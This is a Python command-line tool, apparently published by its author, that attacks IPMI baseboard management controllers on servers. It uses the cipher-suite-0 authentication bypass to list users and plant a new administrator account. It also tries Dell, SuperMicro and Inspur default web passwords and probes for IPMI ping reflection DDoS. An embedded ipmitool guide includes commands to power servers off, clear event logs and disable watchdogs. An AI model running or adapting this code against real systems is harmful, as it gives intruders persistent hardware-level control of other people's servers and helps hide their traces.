#!/usr/bin/env python
# -*- coding:utf-8 -*-


#引入依赖包、库文件
import os
import sys
import time
import socket
import logging
import requests
from optparse import OptionParser


#全局设置：
socket.setdefaulttimeout(1)#设置全局socket超时时间
reload(sys)
sys.setdefaultencoding("utf-8")
logging.basicConfig(filename="./ipmicrack.running.log",level=logging.INFO,filemode='a',format='[%(asctime)s][%(thread)d][%(filename)s][line: %(lineno)d][%(levelname)s] ## %(message)s')


#定义全局变量
VERSION_STRING = """\033[0;32m
                            IPMI多漏洞验证工具  V1.0.1
        目前WEB端仅支持浪潮、戴尔、supermicro服务器的攻击验证,CO套件攻击支持所有版本IPMI后台
                                作者：挖洞的土拨鼠
                        维护：WeChat No. => cr1914518025
\033[0m"""

HEADER = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0",
    "Accept":"application/json, text/plain, */*",
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding":"gzip, deflate",
    "Content-Type":"application/json;charset=utf-8"
}


#摘自他人博客的IPMITOOL使用说明
IPMI_OPERATE_DOCUMENT = """\033[0;32m
常用的管理命令包括：

================
系统管理命令
================
1. 查看设备信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin chassis status

2. 查看用户
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user list

3. 增加用户
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user set name 3 test1
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user list
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user set password 3 test1
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user priv 3 20
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user list
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U test1 -P test1 user list

4. disable/enable用户
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user disable 3
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U test1 -P test1 user list
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user enable 3
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U test1 -P test1 user list

5. 查看服务器当前开电状态
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power status

6. 服务器的开机，关机，reset和power cycle
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power on
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power off
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power cycle
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power reset

7. 查看服务器的80 Port当前状态
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin raw 0x30 0xB2

8. 查看服务器的传感器状态
所有传感器状态详细信息：
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sensor
传感器SDR summary信息：
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sdr info
传感器SDR 列表信息：
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sdr list
FRU传感器SDR 列表信息：
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sdr list fru
下载RAW SDR信息到文件：
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sdr dump sdr.raw

9. 查看服务器的FRU信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin fru
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin fru print

================
BMC自身配置命令
================
1. 查看BMC的信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc info

2. 查看BMC的LAN信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin lan print 1
（一般channel 1为LAN）

3. 修改BMC的MAC信息（只能在本地以root用户做，因为在此之前没IP）
enable BMC MAC SET mode:
/usr/bin/ipmitool raw 0x0c 0x01 0x01 0xc2 0x00
Write MAC to BMC (BMC MAC=d0:27:88:a4:e4:37):
/usr/bin/ipmitool raw 0x0c 0x01 0x01 0x05 0xD0 0x27 0x88 0xA4 0xE4 0x37

4. 修改BMC的网络为自动从DHCP获得IP地址，而不是静态的（只能在本地以root用户做，因为在此之前没IP）
确定channel 1为LAN:
/usr/bin/ipmitool lan print 1
设定channel 1从DHCP获得IP:
/usr/bin/ipmitool lan set 1 ipsrc dhcp

5. 重启BMC自己（不是服务器）（小心BMC挂掉hang）
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc reset

================
SOL和通过IPMItool访问系统终端 (Serial-Over-LAN)
================
1. 查看当前的SOL summary信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sol info 1

2. 修改SOL配置信息
查看所有可能的配置
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sol set
修改波特率配置
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sol set non-volatile-bit-rate 38.4 1
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sol set volatile-bit-rate 38.4 1

3. 开启远程终端
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sol activate
(可以使用~.退出,~?显示帮助信息)

================
Watchdog配置命令
================
1. 查看当前的watchdog信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc watchdog get

2. 设置，开启一个watchdog
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc watchdog get
设置一个OS WDT的watchdog, 超时时间为60秒（自己看IPMI 2.0手册,351页的27.6 Set Watchdog Timer Command）(60x10=600 = 0x258)
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin raw 0x06 0x24 0x04 0x01 0x00 0x10 0x58 0x2
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc watchdog get
开启该watchdog
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc watchdog reset
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc watchdog get

禁止该watchdog的动作(Hard reset-> no action)

/usr/bin/ipmitool -I lanplus -H 10.32.228.187 -U sysadmin -P admin raw 0x06 0x24 0x04 0x00 0x00 0x10 0x58 0xFF

上面的命令把时间改为非常大，提示第1个0x00表示没有动作，0x04表示是SMS/OS的watchdog, 0xFF58是超时的时间，单位为100ms。

================
SEL命令
================
1. 查看当前的SEL summary信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel info

2. 列示所有SEL记录详细信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel list
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel list 10

3. 删除指定的SEL记录
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel delete 1

4. 清除所有的SEL记录
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel clear

5. 获取和修改SEL当前时钟
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel time get
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin sel time set "04/24/2012 18:44:44"

6. 以RAW方式查看制定的SEL数据

/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin raw 0xa 0x43 0 0 111 0 0 0xFF

0xa 0x43为Get SEL Entry Command； 0 0 保留值，111 0 表示取第112条记录（从0开始），0 为offset，保留；0xFF为读取的字节数，FF表示取整条记录

================
PEF命令
================
1. 查看BMC当前的PEF 支持信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin pef
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin pef info

2. 查看BMC当前的PEF 配置表信息（配置表也是可以修改的）
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin pef list

3. 查看BMC当前的PEF 状态信息(BMC处理的最后一条SEL记录)
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin pef status

4. 修改BMC当前的PEF 配置表
查看当前的PEF 配置表
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin pef list
假定我们要删除下面这条配置项
1 | active, pre-configured | 0x11 | Voltage | Any | None | OEM | Any | Power-off,OEM-defined
获取该配置项的配置信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin raw 0x04 0x13 0x07 0x01 0x00
11 01 40
修改该配置项的配置信息
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin raw 0x04 0x12 0x07 0x01 0x40
检查修改后的PEF配置表
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin pef list



================
特殊命令
================
1. 查看ipmi服务器端当前活动的session会话
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin session info active

2. 执行一个保存在文件中的所有ipmitool命令
/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin exec myipmi.cmd

=====================================总结======================================================

#service ipmi start
#ipmitool -I open shell
#### 可以直接进入本地BMC shell
#ipmitool -I lan -H -U shell
#### 输入password,进入IPMI交互模式,当然这里也可以把shell直接换成bmc命令 , 另外ipmitool支持端口,所以是否可以先做DNAT，然后远程直接管理内网机器.
#### ipmitool提供的功能要比windows下ipmish提供的功能多得多，用法相对复杂一些
参考下面转摘的文章来详细了解命令
引用
Ipmitool本地监控使用命令：ipmitool –I open command，其中-I open表示使用OpenIPMI接口，command有以下项：
a) raw：发送一个原始的IPMI请求，并且打印回复信息。
b) Lan：配置网络（lan）信道(channel)
c) chassis ：查看底盘的状态和设置电源
d) event：向BMC发送一个已经定义的事件（event），可用于测试配置的SNMP是否成功
e) mc： 查看MC（Management Contollor）状态和各种允许的项
f) sdr：打印传感器仓库中的所有监控项和从传感器读取到的值。
g) Sensor：打印详细的传感器信息。
h) Fru：打印内建的Field Replaceable Unit (FRU)信息
i) Sel： 打印 System Event Log (SEL)
j) Pef： 设置 Platform Event Filtering (PEF)，事件过滤平台用于在监控系统发现有event时候，用PEF中的策略进行事件过滤，然后看是否需要报警。
k) Sol/isol：用于配置通过串口的Lan进行监控
l) User：设置BMC中用户的信息 。
m) Channel：设置Management Controller信道。
Ipmitool –I open sensor list命令可以获取传感器中的各种监测值和该值的监测阈值，包括（CPU温度，电压，风扇转速，电源调制模块温度，电源电压等信息）
Ipmitool –I open sensor get “CPU0Temp”可以获取ID为CPU0Temp监测值，CPU0Temp是sensor的ID，服务器不同，ID表示也不同。
Ipmitool –I open sensor thresh 设置ID值等于id的监测项的各种限制值。
Ipmitool –I open chassis status查看底盘状态，其中包括了底盘电源信息，底盘工作状态等
Ipmitool –I open chassis restart_cause查看上次系统重启的原因
Ipmitool –I open chassis policy list 查看支持的底盘电源相关策略。
Ipmitool –I open chassis power on启动底盘，用此命令可以远程开机
Ipmitool –I open chassis power off关闭底盘，用此命令可以远程开机
Ipmitool –I open chassis power reset实现硬重启，用此命令可以远程开机
Ipmi还可以设置系统启动boot的设备，具体见ipmitool帮助文档。
Ipmitool –I open mc reset 使BMC重新硬启动
Ipmitool –I open mc info 查看BMC硬件信息
Ipmitool –I open mc getenables 列出BMC所有允许的选项
Ipmitool –I open mc setenables =[on|off]，设置bmc相应的允许/禁止选项。
Ipmitool-I open event 1 发送一个温度过高的消息到System Event Log中，可以发送的Event有：
1 Temperature: Upper Critical: Going High
2 Voltage Threshold: Lower Critical: Going Low
3 Memory: Correctable ECC Error Detected
Ipmitool-I open event命令可以用测试配置的IPMI中的snmp功能是否成功。
Ipmitool -I open lan print 1 打印现咱channel 1的信息 。
Ipmitool -I open lan set 1 ipaddr 10.10.113.95设置channel 1 的地址为10.10.113.95
Ipmitool -I open lan set 1 snmp public设置channel 1 上snmp的community为public。
Ipmitool -I open lan set 1 access on设置channel 1允许访问。
Ipmitool -I open pef info打印Platform Event Filtering （pef）信息
Ipmitool -I open pef status查看Platform Event Filtering （pef）状态
Ipmitool -I open pef policy查看Platform Event Filtering （pef）策略设置
Ipmitool -I open sdr list fru 读取fru信息并显示。
\033[0m"""


#关于IPMI-PING反射DDOS的验证
def STRING_TO_BINARY(content):
    """将文本流转换成二进制流"""
    return content.replace(' ','').replace('\n','').decode('hex')

def SEND_IPMI_PING_PACKET(ip,port=623):
    """
        发送IPMIPING报文，尝试获取响应，大量的该类型报文将导致DRDDoS
        反射流量放大倍数约为1.167倍
        06 -> RMCP Version
        00 -> RMCP Reserved
        FO -> RMCP Sequence Number
        06 -> RMCP Message Class (ASF)
        00 -> ASF IANA
        00 -> ASF IANA
        11 -> ASF IANA
        BE -> ASF IANA
        80 -> Presence Ping
        10 -> ID
        00 -> Resv
        00 -> Resv
    """
    packet_data = "0600F006000011BE80100000"#IPMIPing报文格式
    socks = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#使用UDP发送
    socks.sendto(STRING_TO_BINARY(packet_data),(ip,port))
    try:
        data,addr = socks.recvfrom(1024)
    except Exception,reason:
        logging.error(reason)
        print "\033[0;32m%s 不存在反射分布式拒绝服务攻击\033[0m"%ip
        return False
    print """\033[0;32m
        [*] 存在反射分布式拒绝服务攻击
        [*] 发送数据大小 : %s
        [*] 接受数据大小 : %s
        [*] 接受对端地址 : %s
    \033[0m"""%(str(len(packet_data)),str(len(data)),str(addr))
    return True


#关于C0套件绕过密码执行命令的
def IPMI_C0_SUITE_NO_AUTH_SESSION(ip,user="admin",ifname="en4"):
    """验证0套件攻击漏洞是否存在"""
    command = "ipmitool -I lanplus -C 0 -H %s -U %s -P '' session info active"%(ip,user)#查看活跃session
    session_informatin_object = os.popen(command)
    session_informatin_string = session_informatin_object.read()
    session_informatin_string_list = session_informatin_string.replace(" ","").split("\n")
    for string in session_informatin_string_list:
        if string.find("consoleip") >= 0:#根据返回值内容判断是否存在漏洞
                print "\033[0;32m[*] %s : 存在漏洞--0套件可绕过验证直接执行命令\n%s\033[0m"%(ip,session_informatin_string)
                session_informatin_object.close()
                exit(0)
    session_informatin_object.close()
    print "\033[0;31m[+] %s 不存在0套件绕过身份验证执行命令的漏洞\033[0m"%ip

def GET_LASTID_NUMBER(ip,username="admin"):
        """获取下一个可增加用户的USERID，获取最后一个用户的ID +1后返回"""
        user_object = os.popen("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user list"%(ip,username))
        user_list = user_object.read()
        user_object.close()
        lines = [line for line in user_list.split("\n")]
        addflag = True
        for line in lines[1:]:
            if line.find("NO ACCESS") >= 0:
                lastid = int(lines[-2].split(" ")[0])
                addflag = False
        if addflag:
            lastid += 1
        return lastid

def IPMI_C0_NO_AUTH_ADD_USER_DETECT(ip,user='admin'):
    '''验证是否可以继续增加用户，根据最大用户数和现有用户数判断'''
    process_session = os.popen("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user summary"%(ip,user))
    summary_string = process_session.read()
    process_session.close()
    lines = [line for line in summary_string.split("\n")]
    maxnumber = int(lines[0].split(" ")[-1])
    numbersize = int(lines[1].split(" ")[-1])
    if numbersize < maxnumber:
        print "\033[0;32m[*] 可以添加用户\n%s\033[0m"%summary_string
    else:
        print "\033[0;31m[-] 无法添加用户\n%s\033[0m"%summary_string


def IPMI_C0_SUITE_NO_AUTH_SHOW_USER(ip,user='admin'):
    """展示所有现有用户的信息"""
    process_session = os.popen("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user list"%(ip,user))
    print """\033[0;32m%s\033[0m"""%str(process_session.read())
    process_session.close()

def IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip,user='admin',username="ipmicrack",password='ipmicrack'):
    """添加一个新用户"""
    try:
        user_id = str(GET_LASTID_NUMBER(ip,user))
        print user_id
        process_session = os.system("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user set name %s %s"%(ip,user,user_id,username))#添加用户
        process_session = os.system("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user set password %s %s"%(ip,user,user_id,password))#设置密码
        process_session = os.system("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user priv %s 4 "%(ip,user,user_id))#配置管理员权限
        process_session = os.system("ipmitool -I lanplus -C 0 -H %s -U %s -P '' user enable %s"%(ip,user,user_id))#启用用户
        return True
    except Exception,reason:
        logging.error(reason)
        return False



#关于浪潮套件的WEB界面登录默认密码尝试
def INSPUR_LOGIN_PACKET_SEND(ip):
    """发送浪潮的WEB登录报文"""
    login_data = {"WEBVAR_USERNAME":"admin","WEBVAR_PASSWORD":"admin"}
    try:
        response = requests.post("http://%s/rpc/WEBSES/create.asp"%str(ip),headers=HEADER,data=login_data,timeout=5)
    except Exception,reason:
        logging.error(reason)
        return -1
    if response.status_code != 200:
        return -1
    else:
        return response.content

def INSPUR_HTTP_CONTENT_CHECK(content):
    """判断浪潮的登录响应报文"""
    if content.find("SESSIN_COOKIE") >= 0 and content.find("Failure_Login_IPMI_Then_LDAP_then_Active_Directory_Radius") < 0:
        return 0
    else:
        return -1

def INSPUR_CRACK(ip):
    """浪潮WEB尝试函数"""
    content = INSPUR_LOGIN_PACKET_SEND(ip)
    if content != -1:
        result = INSPUR_HTTP_CONTENT_CHECK(content)
        if result == 0:
            print "\033[0;32m[*] %s 默认登录认证信息: admin/admin\033[0m"%ip
        else:
            print "\033[0;32m[+] %s 存在爆破漏洞,但密码未知，建议使用字典爆破\033[0m"%ip
    else:
        print "\033[0;31m[-] %s 不可访问\033[0m"%ip

#关于DELL套件的WEB界面登录默认密码尝试
def DELL_LOGIN_PACKET_SEND(ip):
    """发送DELL的WEB登录报文"""
    global HEADER
    #proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", }
    HEADER["Content-Type"] = "application/x-www-form-urlencoded"
    HEADER["Accept"] = "*/*"
    HEADER["Referer"] = "https://%s/login.html"%ip
    try:
        response = requests.post("https://%s/data/login"%str(ip),headers=HEADER,data=[('user','root'),('password','calvin')],verify=False,timeout=5)
    except Exception,reason:
        logging.error(reason)
        return -1
    if response.status_code != 200:
        return -1
    else:
        return response.content

def DELL_HTTP_CONTENT_CHECK(content):
    """判断DELL的登录响应报文"""
    if content.find("index.html") < 0:
        return 0
    else:
        return -1

def DELL_CRACK(ip):
    """DELLWEB尝试函数"""
    content = DELL_LOGIN_PACKET_SEND(ip)
    if content != -1:
        result = DELL_HTTP_CONTENT_CHECK(content)
        if result == 0:
            print "\033[0;32m[*] %s DELL默认登录认证信息: root/calvin\033[0m"%ip
        else:
            print "\033[0;32m[+] %s 安全\033[0m"%ip
    else:
        print "\033[0;31m[-] %s 不可访问\033[0m"%ip

#关于SuperMicro套件的WEB界面登录默认密码尝试
def SUPERMICRO_LOGIN_PACKET_SEND(ip):
    """发送SuperMicro的WEB登录报文"""
    global HEADER
    #proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", }
    HEADER["Content-Type"] = "application/x-www-form-urlencoded"
    HEADER["Accept"] = "text/html,application/xhtml+xml,application/xml,q=0.9,*/*,q=0.8"
    HEADER["Referer"] = "https://%s/"%ip
    try:
        response = requests.post("https://%s/cgi/login.cgi"%str(ip),headers=HEADER,data=[('name','ADMIN'),('pwd','ADMIN')],verify=False,timeout=5)
    except Exception,reason:
        logging.error(reason)
        return -1
    if response.status_code != 200:
        return -1
    else:
        return response.content

def SUPERMICRO_HTTP_CONTENT_CHECK(content):
    """判断SuperMicro的登录响应报文"""
    if content.find("top.location.href = location.href;") < 0:
        return 0
    else:
        return -1

def SUPERMICRO_CRACK(ip):
    """SuperMicroWEB尝试函数"""
    content = SUPERMICRO_LOGIN_PACKET_SEND(ip)
    if content != -1:
        result = SUPERMICRO_HTTP_CONTENT_CHECK(content)
        if result == 0:
            print "\033[0;32m[*] %s SuperMicro默认登录认证信息: ADMIN/ADMIN\033[0m"%ip
        else:
            print "\033[0;32m[+] %s 安全\033[0m"%ip
    else:
        print "\033[0;31m[-] %s 不可访问\033[0m"%ip

if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-a","--addr",dest="address",help="Target IP Addresses!")
    parser.add_option("-i","--inet",dest="ifname",help="Interface Name!")
    parser.add_option("-A","--Add",dest="adduser",action="store_true",help="Add a new User!")
    parser.add_option("-s","--show",dest="showuser",action="store_true",help="SHOW ALL Users!")
    parser.add_option("-S","--showadd",dest="showadd",action="store_true",help="SHOW CAN ADD Users!")
    parser.add_option("-d","--dev",dest="device",help="Target WEB device!")
    parser.add_option("-D","--docs",dest="docs",action="store_true",help="Docments")
    parser.add_option("-u","--user",dest="user",help="Username For C0 user!")
    parser.add_option("-U","--username",dest="username",help="Username For Add a new user!")
    parser.add_option("-P","--password",dest="password",help="Password For Add a new user!")
    parser.add_option("-p","--ping",dest="ipmiping",action="store_true",help="Test IPMIPing for DRDDoS!")
    parser.add_option("-t","--timeout",dest="timeout",help="Timeout Of Seconds!")
    parser.add_option("-v","--version",dest="version",action="store_true",help="Show Version")
    parser.add_option("-V","--verify",dest="verify",action="store_true",help="Verify IPMI C0 SESSION")
    (options, arges) = parser.parse_args()
    if options.timeout not in [None,""]:
        try:
            timeout = int(options.timeout)
        except Exception,reason:
            logging.error(reason)
            print "\033[0;31m[-] 超时时间设置无效，使用默认超时时间\033[0m"
            timeout = 1
        timeout = 1 if timeout <= 1 else timeout
        socket.setdefaulttimeout(timeout)
    if options.version:
        print VERSION_STRING
        exit(0)
    if options.docs:
        print IPMI_OPERATE_DOCUMENT
        exit(0)
    if options.ipmiping:
        if options.address in ["",None]:
            print "\033[0;31m[-] 请指定对端IP地址\033[0m"
            exit(0)
        SEND_IPMI_PING_PACKET(options.address)
    if options.verify:
        if options.address in ["",None]:
            print "\033[0;31m[-] 请指定对端IP地址\033[0m"
            exit(0)
        if options.ifname in ["",None]:
            print "\033[0;31m[-] 请指定本端网卡名称\033[0m"
            exit(0)
        if options.user in ["",None]:
            IPMI_C0_SUITE_NO_AUTH_SESSION(options.address,ifname=options.ifname)
        else:
            IPMI_C0_SUITE_NO_AUTH_SESSION(options.address,user=options.user,ifname=options.ifname)
    if options.showadd:
        if options.address in ["",None]:
            print "\033[0;31m[-] 请指定对端IP地址\033[0m"
            exit(0)
        if options.user in ["",None]:
            IPMI_C0_NO_AUTH_ADD_USER_DETECT(options.address)
        else:
            IPMI_C0_NO_AUTH_ADD_USER_DETECT(options.address,user=options.user)
        exit(0)
    if options.showuser:
        if options.address in ["",None]:
            print "\033[0;31m[-] 请指定对端IP地址\033[0m"
            exit(0)
        if options.user in ["",None]:
            IPMI_C0_SUITE_NO_AUTH_SHOW_USER(options.address)
        else:
            IPMI_C0_SUITE_NO_AUTH_SHOW_USER(options.address,user=options.user)
        exit(0)
    if options.adduser:
        if options.address in ["",None]:
            print "\033[0;31m[-] 请指定对端IP地址\033[0m"
            exit(0)
        if options.user in ["",None]:
            if options.username in ["",None] and options.password in ["",None]:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address)
            elif options.username not in ["",None] and options.password in ["",None]:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,username=options.username)
            elif options.username in ["",None] and options.password not in ["",None]:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,password=options.password)
            else:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,username=options.username,password=options.password)
        else:
            if options.username in ["",None] and options.password in ["",None]:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,user=options.user)
            elif options.username not in ["",None] and options.password in ["",None]:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,user=options.user,username=options.username)
            elif options.username in ["",None] and options.password not in ["",None]:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,user=options.user,password=options.password)
            else:
                IPMI_C0_SUITE_NO_AUTH_ADD_USER(ip=options.address,user=options.user,username=options.username,password=options.password)
        exit(0)
    if options.device not in ["",None]:
        if str(options.device).upper() not in ["SUPERMICRO","DELL","INSPUR"]:
            print "\033[0;31m[-] 请指定支持WEB验证的厂家类型 SuperMicro,Dell,Inspur\033[0m"
            exit(0)
        else:
            function_switch = {"SUPERMICRO":SUPERMICRO_CRACK,"DELL":DELL_CRACK,"INSPUR":INSPUR_CRACK}
            if options.address in ["",None]:
                print "\033[0;31m[-] 请指定对端IP地址\033[0m"
                exit(0)
            function_switch[options.device.upper()](options.address)
